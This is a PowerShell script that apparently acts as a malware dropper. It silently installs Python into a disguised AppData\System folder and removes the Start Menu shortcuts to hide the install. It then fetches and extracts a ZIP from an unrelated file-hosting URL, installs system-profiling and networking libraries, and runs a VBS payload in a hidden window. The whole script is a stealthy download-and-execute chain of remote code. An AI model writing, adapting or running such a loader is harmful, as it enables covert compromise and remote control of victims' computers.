# Define variables
$pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
$zipScriptUrl = "https://s01.babup.com/uploads/SystemXCXZ.zip"
$targetDirectory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.11"

# Function to check if the directory contains four files or shortcuts
function CheckDirectoryContent {
    $items = Get-ChildItem -Path $targetDirectory -ErrorAction SilentlyContinue
    return ($items.Count -eq 4)
}

# Create directory if it doesn't exist
$directoryPath = "$env:USERPROFILE\AppData\System"
if (-not (Test-Path -Path $directoryPath -PathType Container)) {
    New-Item -Path $directoryPath -ItemType Directory
}

# Download and install Python silently
Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile "$env:USERPROFILE\AppData\System\pythonX.exe"
Start-Process -FilePath "$env:USERPROFILE\AppData\System\pythonX.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait

# Wait for the target directory to contain four files or shortcuts
while (-not (CheckDirectoryContent)) {
    Start-Sleep -Seconds 1
}

# Remove existing Python 3.11 shortcut if it exists
try {
    Remove-Item -Path $targetDirectory -Force -Recurse -ErrorAction Stop
}
catch {
    # Folder and files do not exist, continue
}

# Download the zip script
Invoke-WebRequest -Uri $zipScriptUrl -OutFile "$env:USERPROFILE\AppData\System\System.zip"

# Unzip the script in the same directory
Expand-Archive -Path "$env:USERPROFILE\AppData\System\System.zip" -DestinationPath $directoryPath -Force

# Install required Python libraries
$libs = @("os", "requests", "ctypes", "socket", "time", "platform", "psutil", "subprocess", "uuid", "wmi", "concurrent.futures", "random", "threading")

foreach ($lib in $libs) {
    Start-Process -FilePath "$env:USERPROFILE\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" -ArgumentList "install $lib" -NoNewWindow -Wait
}

# Run BNV.vbs script
Start-Process -FilePath "$env:USERPROFILE\AppData\System\BN.vbs" -WindowStyle Hidden


# Display completion message
Write-Host "Script completed!"
